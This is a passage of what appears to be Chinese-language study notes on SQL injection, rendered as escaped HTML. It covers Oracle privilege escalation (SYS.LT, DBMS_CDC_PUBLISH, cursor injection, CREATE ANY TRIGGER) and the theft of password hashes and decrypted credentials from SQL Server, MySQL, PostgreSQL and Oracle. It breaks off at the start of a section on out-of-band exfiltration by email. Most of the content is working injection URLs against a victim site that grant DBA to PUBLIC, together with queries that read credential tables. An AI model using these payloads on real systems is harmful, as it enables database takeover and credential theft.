&lt;h5 id=&#34;SYS-LT&#34;&gt;&lt;a href=&#34;#SYS-LT&#34; class=&#34;headerlink&#34; title=&#34;SYS.LT&#34;&gt;&lt;/a&gt;SYS.LT&lt;/h5&gt;&lt;p&gt;如果数据库用户具有CREATE PROCEDURE权限，我们就可以在该用户的模式(schema) 中创建一个恶意函数，并在SYS.LT包的一个容易遭受攻击的对象中注入该函数(2009年4月 Oracle已经修正了这一问题)。这一攻击的结果，就是我们的恶意函数在SYS许可权限下获得 执行，并且我们获得了 DBA权限。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 创建函数&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/inciex.jsp?id=1 and (select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#34;create or replace function pwn2 return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate &#34;&#34;grant dba to public&#34;&#34;;commit;return &#34;&#34;,1&#34;&#34;;END;&#39;&#39;; commit; end;&#39;) from dual) is not null -- &lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- 利用 SYS.LT&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/index.jsp?id=l and (select dbms_xmlquery. newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#34;begin SYS.LT.CREATEWORKSPACE(&#34;&#34;A10&#34;&#34;&#34;&#34;&#34; and scott.pwn2()=&#34;&#34;&#34;&#34;x&#34;&#34;);SYS.LT.REMOVEWORKSPACE(&#34;&#34;A10&#34;&#34;&#34;&#34; and scott.pwn2()=&#34;&#34;&#34;&#34;x&#34;&#34;);end;&#34;;commit;end;&#39;) from dual) is not null -- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;SYS-DBMS-CDC-PUBLISH&#34;&gt;&lt;a href=&#34;#SYS-DBMS-CDC-PUBLISH&#34; class=&#34;headerlink&#34; title=&#34;SYS.DBMS_CDC_PUBLISH&#34;&gt;&lt;/a&gt;SYS.DBMS_CDC_PUBLISH&lt;/h4&gt;&lt;p&gt;该问题在sys.dbms_cdc_publish.create_change_set包中，该漏洞允许一个具有execute catalog role权限的用户成为DBA&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; begin sys.dbms_cdc_publish.create_change_set(&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;||SCOTT.pwn2()||&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;Y&#39;&#39;&#39;&#39;,sysdate,sysdate);end;&#39;&#39;;commit; end;&#39;) from dual) is not null--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;绕过-CREATE-PROCEDURE-权限&#34;&gt;&lt;a href=&#34;#绕过-CREATE-PROCEDURE-权限&#34; class=&#34;headerlink&#34; title=&#34;绕过 CREATE PROCEDURE 权限&#34;&gt;&lt;/a&gt;绕过 CREATE PROCEDURE 权限&lt;/h5&gt;&lt;p&gt;要求具有create procedure权限&lt;/p&gt;
&lt;h5 id=&#34;cursor注入&#34;&gt;&lt;a href=&#34;#cursor注入&#34; class=&#34;headerlink&#34; title=&#34;cursor注入&#34;&gt;&lt;/a&gt;cursor注入&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; DECLARE D NUMBER;BEGIN D:= DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(D,&#39;&#39;&#39;&#39;declare pragma autonomous_transaction; begin execute immediate &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; grant dba to public&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;commit;end;&#39;&#39;&#39;&#39;,0);SYS.LT.CREATEWORKSPACE(&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39; and dbms_sql.execute(&#39;&#39;&#39;&#39;||D||&#39;&#39;&#39;&#39;)=1--&#39;);SYS.LT.COMPRESSWORKSPACETREE(&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and dbms_sql.execute(&#39;&#39;&#39;&#39;||D||&#39;&#39;&#39;&#39;)=1--&#39;&#39;&#39;&#39;);end;&#39;&#39;; commit; end;&#39;) from dual) is not null--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;SYS-KUPP-PROC&#34;&gt;&lt;a href=&#34;#SYS-KUPP-PROC&#34; class=&#34;headerlink&#34; title=&#34;SYS.KUPP$PROC&#34;&gt;&lt;/a&gt;SYS.KUPP$PROC&lt;/h5&gt;&lt;p&gt;SYS.KUPPSPROC.CREATE MASTER PROCESS()函数是另外一个 Oracle 函数，它允许执行任意PL/SQL语句。只有具有DBA角色的用户才能执行该函数。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; dbms_xmlquery&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;newcontext&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; begin sys.vulnproc(&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;||sys.kupp$proc.create_master_process(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;EXECUTE IMMEDIATE&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE
||&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;);end; &#39;&#39;; commit; end;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;弱许可权限&#34;&gt;&lt;a href=&#34;#弱许可权限&#34; class=&#34;headerlink&#34; title=&#34;弱许可权限&#34;&gt;&lt;/a&gt;弱许可权限&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VIEW&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TRIGGER&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这些权限间接地允许权限提升攻击。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;CREATE ANY TRIGGER&lt;/code&gt;提升权限&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; dbms_xmlquery&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;newcontext&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; create or replace trigger &#34;SYSTEM&#34;. the_trigger before insert on system.OL$ for each row declare pragma autonomous_transaction; BEGIN execute immediate &#39;&#39;&#39;&#39;GRANT DBA TO PUBLIC&#39;&#39;&#39;&#39;; END the_trigger;&#39;&#39;;end;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;窃取哈希口令&#34;&gt;&lt;a href=&#34;#窃取哈希口令&#34; class=&#34;headerlink&#34; title=&#34;窃取哈希口令&#34;&gt;&lt;/a&gt;窃取哈希口令&lt;/h3&gt;&lt;h4 id=&#34;SQL-Server-2&#34;&gt;&lt;a href=&#34;#SQL-Server-2&#34; class=&#34;headerlink&#34; title=&#34;SQL Server&#34;&gt;&lt;/a&gt;SQL Server&lt;/h4&gt;&lt;p&gt;不同版本，差别很大，都需要管理员权限才能访问哈希口令表&lt;/p&gt;
&lt;h5 id=&#34;SQL-Server-2000&#34;&gt;&lt;a href=&#34;#SQL-Server-2000&#34; class=&#34;headerlink&#34; title=&#34;SQL Server 2000&#34;&gt;&lt;/a&gt;SQL Server 2000&lt;/h5&gt;&lt;p&gt;哈希口令储存在master数据库的sysxlogins表中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysxlogins &lt;span class=&#34;token comment&#34;&gt;-- 检索&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由pwdencrypt()函数生成，哈希值由头，salt，区分大小写的哈希，不区分大小写的哈希组成&lt;/p&gt;
&lt;h5 id=&#34;SQL-Server-2005-2008&#34;&gt;&lt;a href=&#34;#SQL-Server-2005-2008&#34; class=&#34;headerlink&#34; title=&#34;SQL Server 2005,2008&#34;&gt;&lt;/a&gt;SQL Server 2005,2008&lt;/h5&gt;&lt;p&gt;sysxlogins不存在了，移除了不区分大小写的哈希&lt;/p&gt;
&lt;p&gt;通过查询sql_logins视图检索哈希口令&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; password_hash &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sql_logins&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用fh_varbintohexstr()函数将哈希值显式地强制转换为十六进制字符串&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_hash)+from+sys.sql_logins+where+name+=+&#39;sa&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Mysql-1&#34;&gt;&lt;a href=&#34;#Mysql-1&#34; class=&#34;headerlink&#34; title=&#34;Mysql&#34;&gt;&lt;/a&gt;Mysql&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; mysql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 检索哈希口令，哈希口令由password()函数产生，算法随版本&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;PostgreSQL-2&#34;&gt;&lt;a href=&#34;#PostgreSQL-2&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h4&gt;&lt;p&gt;如果刚好具有administrative权限，就可以访问pg_shadow表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; usename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; passwd &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_shadow
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; rolname&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; rolpassword &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_authid&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;HASH&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;md5&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; MD5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foobar&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; md53858f62230ac3c915f300c664312c63f
&lt;span class=&#34;token comment&#34;&gt;-- foo是password，bar是username &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Oracle-2&#34;&gt;&lt;a href=&#34;#Oracle-2&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h4&gt;&lt;p&gt;Oracle在sys.user$表的password列存储数据库账户的哈希口令。dba_users视图指向该表，但从Oracle 11g开始，数据加密标准(Data Encryption Standard, DES)的哈希口令不再出现在 dba_user视图中。sys.user$表包含数据库用户(type#=1)和数据库角色(type#=0)的哈希口令。&lt;/p&gt;
&lt;p&gt;针对Oracle DES用户名口令：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&amp;gt;0 andlength(password)=16&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;针对Oracle DES角色口令：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#=1&lt;/span&gt;
andlength&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;针对 Oracle SHA1 口令(11g+)：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;spare4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;spare4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; salt fromsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&amp;gt;0 and length(spare4)=62;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sysman.mgmt_credentials2表是通常能找到的SYS用户明文口令的示例。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- get the cleartext password of the user MGMT_VIEW (generated by Oracle during the installation time, looks like a hash but is a password) &lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; view_username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;view_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; Password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mgmt_view_user_credentials&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- get the password of the dbsnmp user, databases listener and OS credentials&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;credential_value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; sysmanuser&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;credential_value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; Password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mgmt_credentials2 t1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mgmt_credentials2 t2 &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;credential_guid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;t2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;credential_guid
&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;credential_set_column&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;credential_set_column&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;password&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- get the username and password of the Oracle Knowledgebase Metalink &lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ARU_USERNAME&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ARU_PASSWORD&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; SYSMAN&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;MGMT_ARU_CREDENTIALS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Oracle组件&#34;&gt;&lt;a href=&#34;#Oracle组件&#34; class=&#34;headerlink&#34; title=&#34;Oracle组件&#34;&gt;&lt;/a&gt;Oracle组件&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;APEX&lt;/li&gt;
&lt;li&gt;Oracle Internet Directory&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;带外通信&#34;&gt;&lt;a href=&#34;#带外通信&#34; class=&#34;headerlink&#34; title=&#34;带外通信&#34;&gt;&lt;/a&gt;带外通信&lt;/h3&gt;&lt;p&gt;用于发送请求的HTTP(S)连接被用于接收响应。不过也有例外的情况：可以通过完全不同的信道来传输结果。我们称这样的通信 为“带外”，或简称为OOB(Out Of Band)。&lt;/p&gt;
&lt;h4 id=&#34;e-mail&#34;&gt;&lt;a href=&#34;#e-mail&#34; class=&#34;headerlink&#34; title=&#34;e-mail&#34;&gt;&lt;/a&gt;e-mail&lt;/h4&gt;&lt;p&gt;攻击者需要做的是构造一种利用，通过它来提取想要的信息，将数据打包到e-mail中并使用专门的数据库函数插入到e-mail队列中。之后该e-mail就会出现在攻击者的邮箱中。&lt;/p&gt;
&lt;h5 id=&#34;MS-Server&#34;&gt;&lt;a href=&#34;#MS-Server&#34; class=&#34;headerlink&#34; title=&#34;MS Server&#34;&gt;&lt;/a&gt;MS Server&lt;/h5&gt;&lt;p&gt;SQL Mail（SQL Server 2000、2005 和 2008）和 Database Mail（SQL Server 2005 和 2008）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;SQL Mail&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_startmail&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
